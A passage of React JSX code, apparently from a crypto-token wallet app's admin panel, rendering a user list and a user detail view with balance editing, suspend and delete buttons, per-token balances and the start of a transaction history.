            {filtered.length === 0 && <div style={{ textAlign: "center", padding: 60, color: "#64748B" }}><div style={{ fontSize: 40, marginBottom: 10 }}>👥</div><div>No users found</div></div>}
            {filtered.map(u => (
              <div key={u.email} onClick={() => setSel(u)} style={{ background: C.adminSurface, border: `1px solid ${C.adminBorder}`, borderRadius: 14, padding: "14px 18px", display: "flex", alignItems: "center", cursor: "pointer", marginBottom: 10 }}
                onMouseEnter={e => e.currentTarget.style.borderColor = C.adminAccent}
                onMouseLeave={e => e.currentTarget.style.borderColor = C.adminBorder}>
                <div style={{ width: 40, height: 40, background: u.suspended ? "#475569" : C.adminAccent, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, marginRight: 14, fontSize: 17 }}>{u.name?.[0]?.toUpperCase() || "?"}</div>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontWeight: 700, fontSize: 14, color: "#E2E8F0", display: "flex", gap: 6, alignItems: "center", flexWrap: "wrap" }}>
                    {u.name}
                    {u.suspended && <span style={{ background: "#7F1D1D", color: C.red, fontSize: 9, borderRadius: 6, padding: "2px 7px", fontWeight: 700 }}>SUSPENDED</span>}
                    {u.adminCreated && <span style={{ background: "#1E1B4B", color: "#818CF8", fontSize: 9, borderRadius: 6, padding: "2px 7px", fontWeight: 700 }}>ADMIN</span>}
                  </div>
                  <div style={{ fontSize: 11, color: "#64748B" }}>{u.email}</div>
                </div>
                <div style={{ textAlign: "right", flexShrink: 0 }}>
                  <div style={{ fontWeight: 700, color: C.green, fontSize: 13 }}>{fmtUSD(totUSD(u))}</div>
                  <div style={{ fontSize: 11, color: "#64748B" }}>{(u.transactions || []).length} txns</div>
                </div>
                <div style={{ marginLeft: 10, color: "#475569", fontSize: 18 }}>›</div>
              </div>
            ))}
          </div>
        )}

        {/* User Detail */}
        {tab === "users" && sel && (
          <div>
            <button onClick={() => setSel(null)} style={{ background: "transparent", border: `1px solid ${C.adminBorder}`, color: "#94A3B8", borderRadius: 10, padding: "9px 16px", cursor: "pointer", fontSize: 13, fontWeight: 600, marginBottom: 18 }}>← Back</button>
            <div style={{ background: C.adminSurface, border: `1px solid ${C.adminBorder}`, borderRadius: 14, padding: 20, marginBottom: 14, display: "flex", alignItems: "center", gap: 16, flexWrap: "wrap" }}>
              <div style={{ width: 52, height: 52, background: sel.suspended ? "#475569" : C.adminAccent, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, fontSize: 22, flexShrink: 0 }}>{sel.name?.[0]?.toUpperCase() || "?"}</div>
              <div style={{ flex: 1 }}>
                <div style={{ fontWeight: 800, fontSize: 17, color: "#E2E8F0" }}>{sel.name}</div>
                <div style={{ color: "#64748B", fontSize: 12, marginTop: 2 }}>{sel.email}</div>
                <div style={{ fontSize: 11, color: "#475569", marginTop: 3 }}>Ref code: <span style={{ color: C.adminAccent, fontWeight: 700 }}>{sel.refCode}</span></div>
              </div>
              <div style={{ textAlign: "right" }}>
                <div style={{ color: C.green, fontWeight: 800, fontSize: 18 }}>{fmtUSD(totUSD(sel))}</div>
                <div style={{ fontSize: 11, color: "#64748B" }}>Total Value</div>
              </div>
            </div>
            <div style={{ display: "flex", gap: 10, marginBottom: 14, flexWrap: "wrap" }}>
              <button onClick={() => setShowEdit(true)} style={{ flex: 1, minWidth: 120, background: `linear-gradient(135deg,${C.adminAccent},#818CF8)`, border: "none", borderRadius: 12, padding: "12px 0", color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>💰 Edit Balance</button>
              <button onClick={() => toggleSuspend(sel)} style={{ flex: 1, minWidth: 120, background: sel.suspended ? "#064E3B" : "#7F1D1D", border: "none", borderRadius: 12, padding: "12px 0", color: sel.suspended ? "#34D399" : C.red, fontWeight: 700, fontSize: 14, cursor: "pointer" }}>{sel.suspended ? "✅ Reactivate" : "🚫 Suspend"}</button>
              <button onClick={() => setConfirmDel(sel.email)} style={{ flex: 1, minWidth: 120, background: "#1C1917", border: `1px solid ${C.red}44`, borderRadius: 12, padding: "12px 0", color: C.red, fontWeight: 700, fontSize: 14, cursor: "pointer" }}>🗑️ Delete</button>
            </div>
            <div style={{ background: C.adminSurface, border: `1px solid ${C.adminBorder}`, borderRadius: 14, padding: 18, marginBottom: 14 }}>
              <div style={{ fontWeight: 700, fontSize: 12, color: "#94A3B8", marginBottom: 12, letterSpacing: 1 }}>BALANCES</div>
              {TOKENS_META.map(tk => (
                <div key={tk.symbol} style={{ display: "flex", alignItems: "center", padding: "9px 0", borderBottom: `1px solid ${C.adminBorder}` }}>
                  <div style={{ width: 30, height: 30, background: tk.bg, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, fontSize: 12, marginRight: 12 }}>{tk.icon}</div>
                  <div style={{ flex: 1, color: "#CBD5E1", fontWeight: 600, fontSize: 13 }}>{tk.symbol}</div>
                  <div style={{ textAlign: "right" }}>
                    <div style={{ fontWeight: 700, color: "#E2E8F0", fontSize: 13 }}>{(sel.balances?.[tk.symbol] || 0).toLocaleString()}</div>
                    <div style={{ fontSize: 11, color: "#64748B" }}>{fmtUSD((sel.balances?.[tk.symbol] || 0) * tk.price)}</div>
                  </div>
                </div>
              ))}
            </div>
            <div style={{ background: C.adminSurface, border: `1px solid ${C.adminBorder}`, borderRadius: 14, padding: 18 }}>
              <div style={{ fontWeight: 700, fontSize: 12, color: "#94A3B8", marginBottom: 12, letterSpacing: 1 }}>TRANSACTION HISTORY</div>
              {(!sel.transactions || sel.transactions.length === 0)
                ? <div style={{ color: "#475569", fontSize: 13, textAlign: "center", padding: 16 }}>No transactions</div>
                : sel.transactions.slice(0, 30).map(tx => (
                  <div key={tx.id} style={{ display: "flex", alignItems: "center", padding: "9px 0", borderBottom: `1px solid ${C.adminBorder}` }}>
                    <div st
